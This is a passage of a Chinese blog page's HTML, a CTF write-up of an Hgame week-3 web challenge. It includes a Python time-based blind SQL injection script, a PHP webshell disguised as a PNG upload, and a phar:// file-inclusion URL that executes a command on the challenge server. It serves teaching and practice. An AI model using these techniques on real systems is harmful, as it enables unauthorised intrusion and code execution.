class="number">127</span>):</span><br><span class="line">        f = requests.get(url,cookies=cook,headers=head)</span><br><span class="line">        token = re.findall(<span class="string">"""value='(.*?)' id='token'&gt;"""</span>,f.content)[<span class="number">0</span>]</span><br><span class="line">        data1[<span class="string">'token'</span>] = token</span><br><span class="line">        g = requests.post(url2,data1,cookies=cook,headers=head)</span><br><span class="line">        f = requests.get(url,cookies=cook,headers=head)</span><br><span class="line">        token = re.findall(<span class="string">"""value='(.*?)' id='token'&gt;"""</span>,f.content)[<span class="number">0</span>]</span><br><span class="line">        data[<span class="string">'token'</span>] = token</span><br><span class="line">        data[<span class="string">'message_id'</span>] = <span class="string">'1800 or if(ascii(substr((select avatar from users where username like 0x616c746d616e3737),%s,1))=%s,sleep(5),1)-- 1'</span>%(str(x),y)</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            g = requests.post(url1,data,cookies=cook,headers=head,timeout=<span class="number">3</span>)</span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            flag += chr(y)</span><br><span class="line">            <span class="keyword">print</span> flag</span><br><span class="line">            <span class="keyword">break</span></span><br></pre></td></tr></table></figure>
+<p>顺利拿到我这个账号随机生成的文件名672bf75b776852d。</p>
+<p>由于文件包含处强制拼接了php后缀</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$page = array_key_exists(<span class="string">'action'</span>, $_GET) ? $_GET[<span class="string">'action'</span>] : <span class="string">'message'</span>;</span><br><span class="line"><span class="keyword">require</span> $page .<span class="string">'.php'</span>;</span><br><span class="line"><span class="keyword">include_once</span>(<span class="string">"template/footer.php"</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<p>无法直接包含文件getshell。</p>
+<p>这里想到利用phar协议。</p>
+<p>将一句话木马文件index.php压缩成一个zip，抓包修改type为<code>image/png</code>将zip文件上传。然后利用phar协议包含文件getshell。</p>
+<p><code>?action=phar://./img/avatar/672bf75b776852d.png/index</code></p>
+<p><img src="/2019/02/12/Hgame-week3-web-/2.png" alt=""></p>
+<p>拿到shell后经过一番搜寻后找到flag</p>
+<figure class="highlight crystal"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">http:</span>/<span class="regexp">/111.231.140.29:10080/index</span>.php?action=<span class="symbol">phar:</span>/<span class="regexp">/./img</span><span class="regexp">/avatar/</span><span class="number">672</span>bf75b776852d.png/<span class="number">1</span>&amp;a=<span class="regexp">/usr/lib</span><span class="regexp">/flag/get</span>_flag%<span class="number">20</span>/usr/<span class="class"><span class="keyword">lib</span>/<span class="title">flag</span>/<span class="title">flag</span></span></span><br></pre></td></tr></table></figure>
+
+      
+    </div>
+    <footer class="entry-meta entry-footer">
+      
+      
+  <span class="ico-tags"></span>
+  <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/wp/">wp</a></li></ul>
+
+      
+    </footer>
+    <hr class="entry-footer-hr">
+  </div>
+  
+    
+<nav id="article-nav">
+  
+  
+    <a href="/2019/02/04/hgame-week2-web/" id="article-nav-older" class="article-nav-link-wrap">
+      <strong class="article-nav-caption">Older</strong>
+      <div class="article-nav-title">Hgame_week2_web</div>
+    </a>
+  
+</nav>
+
+  
+</article>
+
+<!-- Table of Contents -->
+
+  <aside id="sidebar">
+    <div id="toc" class="toc-article">
+    <strong class="toc-title">Contents</strong>
+    
+      <ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#sqli-1"><span class="nav-number">1.</span> <span class="nav-text">sqli-1</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#sqli-2"><span class="nav-number">2.</span> <span class="nav-text">sqli-2</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#神器的md5"><span class="nav-number">3.</span> <span class="nav-text">神器的md5</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#babyxss"><span class="nav-number">4.</span> <span class="nav-text">babyxss</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#基础渗透"><span class="nav-number">5.</span> <span class="nav-text">基础渗透</span></a></li></ol>
+    
+    </div>
+  </aside>
+
+</section>
+        
+      </div>
+
+    </div>
+    <!-- <nav id="mobile-nav">
+  
+    <a href="/" class="mobile-nav-link">Home</a>
+  
+    <a href="/archives" class="mobile-nav-link">Archives</a>
+  
+    <a href="/tags" class="mobile-nav-link">Tags</a>
+  
+    <a href="/friend" class="mobile-nav-link">Friend</a>
+  
+    <a href="/about" class="mobile-nav-link">About</a>
+  
+</nav> -->
+    <footer id="footer" class="site-footer">
+  
+
+  <div class="clearfix container">
+      <div class="site-info">
+	      &copy; 2019 Altm4nz All Rights Reserved.
+        
+            <span id="busuanzi_container_site_uv">  
+              本站总访问量<span id="busuanzi_value_site_pv"></span>次
+            </span>
+          
+      </div>
+      <div class="site-credit">
+        Theme by <a href="https://github.com/iTimeTraveler/hexo-theme-hipaper" target="_blank">hipaper</a>
+      </div>
+  </div>
+</footer>
+
+
+<!-- min height -->
+
+<script>
+    var wrapdiv = document.getElementById("wrap");
+    var contentdiv = document.getElementById("content");
+
+    wrapdiv.style.minHeight = document.body.offsetHeight - document.getElementById("allheader").offsetHeight - document.getElementById("footer").offsetHeight + "px";
+    contentdiv.style.minHeight = document.body.offsetHeight - document.getElementById("allheader").offsetHeight - document.getElementById("footer").offsetHeight + "px";
+
+
+    <!-- headerblur min height -->
+    
+    
+</script>
+    
+<div style="display: none;">
+  <script src="https://s11.cnzz.com/z_stat.php?id=1260716016&web_id=1260716016" language="JavaScript"></script>
+</div>
+
+<!-- mathjax config similar to math.stackexchange -->
+
+<script type="text/x-mathjax-config">
+  MathJax.Hub.Config({
+    tex2jax: {
+      inlineMath: [ ['$','$'], ["\\(","\\)"] ],
+      processEscapes: true
+    }
+  });
+</script>
+
+<script type="text/x-mathjax-config">
+    MathJax.Hub.Config({
+      tex2jax: {
+        skipTags: ['script', 'noscript', 'style', 'textarea', 'pre', 'code']
+      }
+    });
+</script>
+
+<script type="text/x-mathjax-config">
+    MathJax.Hub.Queue(function() {
+        var all = MathJax.Hub.getAllJax(), i;
+        for(i=0; i < all.length; i += 1) {
+            all[i].SourceElement().parentNode.className += ' has-jax';
+        }
+    });
+</script>
+
+<script type="text/javascript" src="https://cdn.mathjax.org/mathjax/latest/MathJax.js?config=TeX-AMS-MML_HTMLorMML">
+</script>
+
+
+  <link rel="stylesheet" href="/fancybox/jquery.fancybox.css">
+  <script src="/fancybox/jquery.fancybox.pack.js"></script>
+
+
+<script src="/js/script.js"></script>
+<script src="/js/bootstrap.js"></script>
+<script src="/js/main.js"></script>
+
+
+
+
+
+
+
+
+	<script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+
+
+
+
+
+
+  </div>
+
+  <a id="rocket" href="#top" class=""></a>
+  <script type="text/javascript" src="/js/totop.js" async=""></script>
+</body>
+</html>
